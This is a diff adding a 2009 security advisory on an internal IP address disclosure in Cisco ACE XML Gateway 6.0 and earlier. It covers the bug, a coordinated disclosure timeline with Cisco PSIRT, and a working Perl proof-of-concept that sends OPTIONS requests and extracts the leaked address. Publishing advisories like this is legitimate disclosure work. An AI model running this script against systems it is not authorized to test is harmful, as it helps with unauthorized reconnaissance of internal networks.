@@ -1,0 +1,220 @@
++-----------------------------------------------------------------------
+-+
+| ....... |
+| ..''xxxxxxxxxxxxxxx'... |
+| ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx.. |
+| ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'. |
+| .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'. |
+| .'xxxxxxxxxxxxxxxxxxxxx''...... ... .. |
+| .xxxxxxxxxxxxxxxxxx'... ........ .'. |
+| 'xxxxxxxxxxxxxxx'...... '. |
+| 'xxxxxxxxxxxxxx'..'x.. .x. |
+| .xxxxxxxxxxxx'...'.. ... .' |
+| 'xxxxxxxxx'.. . .. .x. |
+| xxxxxxx'. .. x. |
+| xxxx'. .... x x. |
+| 'x'. ...'xxxxxxx'. x .x. |
+| .x'. .'xxxxxxxxxxxxxx. '' .' |
+| .xx. .'xxxxxxxxxxxxxxxx. .'xx'''. .' |
+| .xx.. 'xxxxxxxxxxxxxxxx' .'xxxxxxxxx''. |
+| .'xx'. .'xxxxxxxxxxxxxxx. ..'xxxxxxxxxxxx' |
+| .xxx'. .xxxxxxxxxxxx'. .'xxxxxxxxxxxxxx'. |
+| .xxxx'.'xxxxxxxxx'. xxx'xxxxxxxxxx'. |
+| .'xxxxxxx'.... ...xxxxxxx'. |
+| ..'xxxxx'.. ..xxxxx'.. |
+| ....'xx'.....''''... |
+| |
+| CubilFelino Security Research Lab |
+| proudly presents... |
++-----------------------------------------------------------------------
+-+
+
+Vulnerability Information
+=======================================
+Product: Cisco ACE XML Gateway <= 6.0
+Vulnerabily: Internal IP Address Disclosure
+Vendor:	 Cisco Systems, Inc. http://www.cisco.com
+Product URL: http://www.cisco.com/en/US/products/ps7314/
+Author: nitrÿus [ Alejandro Hernandez H. ]
+Discovery Date: 24/Aug/2009
+Attack Vector: Remote
+CVSS v2 Base Score: 5 (Medium) [ AV:N/AC:L/Au:N/C:P/I:N/A:N ]
+Class: I think, it's a Design problem on the error messages' handling
+
+Product Information
+=======================================
+The Cisco ACE XML Gateway is a key component of the Cisco Application Control 
+Engine (ACE) family of products. It brings application intelligence into the 
+network and enables efficient deployment of secure, reliable, and accelerated 
+Web service environments based on XML (Extensible Markup Language) and SOAP 
+(Simple Object Access Protocol) using a shared network infrastructure.
+
+The ACE XML Gateway helps you to secure, manage, monitor, and accelerate an SOA.
+In a service-oriented environment, the ACE XML Gateway acts as a service
+virtualization layer. It decouples service providers from consumers, increasing 
+the stability, maintainability, and flexibility of those services. It enforces 
+security policies and applies business rules, such as routing decisions and 
+content validation processing, across message traffic in the environment.
+
+The ACE XML Gateway secures your SOA implementation by providing advanced XML 
+firewall capabilities, with built-in protection against XML-based attacks, 
+such as SQL injection or entity expansion attacks, content screening capabilities 
+and more.
+
+With a high-performance, streaming XML processing engine, the ACE XML Gateway 
+reduces the performance impact of XML traffic on the network.
+
+Vulnerability Explaination
+=======================================
+Let's wait for the Cisco response, so, we'll have a better understanding on this
+issue. Meanwhile...
+
+I think this is a design error because ACE XML doesn't have in mind that the 
+client could probably be in the same network segment internally, so, it receives 
+the request, which cannot be processed, and throws an error message disclosing 
+an internal IP address.
+
+According to the ACE XML Gateway User Guide, Log Messages chapter, the listed 
+error messages belong to different categories such as Alerts, Startup, Operational 
+and Policy Errors, so, I'm assuming that the OPTIONS HTTP method doesn't fit in 
+none of the mentioned categories, resulting in a message explaining that there's 
+no handler for this type of request which discloses an internal IP address.
+
+Cisco PSIRT (Product Security Incident Response Team) responded by saying that the 
+bug is triggered not only by the OPTIONS request. Internal IP address is included 
+in response if ACE XML Gateway was not able to find a matching handler for the 
+request. Also, the PSIRT verified that GET request, with a path for which no 
+handler was configured, results in the same address disclosure.
+
+Again, I think it's a design error because it wasn't taken into account that the 
+error message would disclose an internal IP address from the internal network.
+
+Disclosure Timeline
+=======================================
+DD/MM/YYYY
+
+24/08/2009 The vulnerability was discovered.
+25/08/2009 Exploit/PoC code was developed (private).
+01/09/2009 Cisco PSIRT (Product Security Incident Response Team) was 
+notificated about the issue.
+02/09/2009 Vendor response asking for details of the testing environment.
+02/09/2009 Test scenario explained and screenshots of the exploitation
+attached.
+03/09/2009 PSIRT Incident Management assing an internal tracking ID number for
+the vulnerability.
+08/09/2009 The PSIRT Incident Manager took the ownership of the vulnerability.
+11/09/2009 Developers confirmed the vulnerability. Code fixes and testing
+remained pending.
+Green flag given to go public whenever I'd like.
+17/09/2009 Fix will available in the next ACE XML Gateway release (6.1).
+PSIRT Incident Manager explained me the PSIRT response process
+followed in case of publishing the vulnerability in BugTraq,
+full-disclosure, milw0rm, packetstorm, etc.
+24/09/2009 Tonight!, the vulnerability goes public and PSIRT is informed.
+
+Exploit/PoC Code
+=======================================
+#!/usr/bin/perl -w
+#
+# Cisco ACE XML Gateway <= 6.0
+# Internal IP Address Disclosure
+#
+# -=- PRIV8 -=- 0day -=- PRIV8 -=- 0day -=- PRIV8 -=-
+#
+# -[nitrÿus]- [ Alejandro Hernandez H. ]
+# nitrousenador -at- gmail -dot- com
+# http://www.brainoverflow.org
+#
+# Mexicÿ / 25-Aug-2ÿÿ9
+#
+# -=- PUBLIC NOW -=-
+# Published on September 24th, 2009
+#
+# ADVISORY: http://www.brainoverflow.org/advisories/cisco_ace_xml_gw_ip_disclosure.t
+xt
+#
+
+use strict;
+use Socket qw/ :DEFAULT :crlf /;	# $CRLF
+use IO::Socket;
+
+sub header
+{
+print " .+==================================+.\n";
+print " / Cisco ACE XML Gateway <= 6.0 \\\n";
+print "| Internal IP Address Disclosure |\n";
+print "| |\n";
+print " \\ -nitr0us- /\n";
+print " `+==================================+`\n\n";
+}
+
+sub usage
+{
+header;
+print "Usage: $0 <host> [port(default 80)]\n";
+exit 0xdead;
+}
+
+my $host = shift || usage;
+my $port = shift || 80;
+my $axg;
+my $axg_response;
+my @payloads = ("OPTIONS / HTTP/1.0" . $CRLF . $CRLF, 
+"OPTIONS / HTTP/1.1" . $CRLF . "Host: " . $host . $CRLF . $CRLF);
+
+header;
+print "[+] Connecting to $host on port $port ...\n";
+
+for(@payloads){
+$axg = IO::Socket::INET->new(	PeerAddr	=>	$host,
+PeerPort	=>	$port,
+Proto	 =>	'tcp')
+or die "[-] Could not create socket: $!\n";
+
+print "[+] Sending payload ...\n";
+print $axg $_;
+
+$axg->read($axg_response, 1024);
+print "[+] Parsing response ...\n";
+
+if($axg_response =~ /Client IP: (.*)/){
+print "[+] Internal IP disclosure: $1\n";
+$axg->close();
+exit 0xbabe;
+}
+
+$axg->close();
+}
+
+print "[-] Not vulnerable !\n";
+
+Solution
+=======================================
+Wait for Cisco ACE XML Gateway 6.1 or Cisco's workaround/patch for previous 
+versions.
+
+Shouts
+=======================================
+Cisco PSIRT (Product Security Incident Response Team) guys, chr1x, ril0, crypkey, 
+alt3kx, hkm, CRAc, #mendozaaaa, nediam, nahual, tr3w, darko, dex, Daemon, beck, 
+ran, HÈctor L., Zeus, www.underground.org.mx, Bucio, etc... etc... etc...
+
+Author Information
+=======================================
+Author: nitrÿus [ Alejandro Hernandez H. ]
+E-mail: nitrousenador -at- gmail -dot- com
+Website: http://www.brainoverflow.org
+Country: Mexico
+
+About CubilFelino Security Research Lab
+=======================================
+It's very peaceful (underground), but dark place in MÈxico which has a lot of 
+desktop and laptop computers, (hardc0re) network hardware, wire/unwired stuff, 
+some hijacked Internet connections, music gear and studio (midi controllers and 
+synthesizers), Psytrance/Drum & Bass music almost always resounding the walls, 
+and why not? a very very nice aquarium with river monsters: piranhas, oscar 
+fish & a plecostomus. Also, it's equipped with a little fridge full of munchies, 
+alcohol and caffeine; with a box of cigarretes on the desktop and a lot of books 
+that can't imagine about (in) security, martial-arts (yeah! we love Ninjutsu 
+hacking) & programming, is the best place to do R+D for the wonderful, exciting 
+& fascinating world of computers and security. Here, Hacking is sublime !
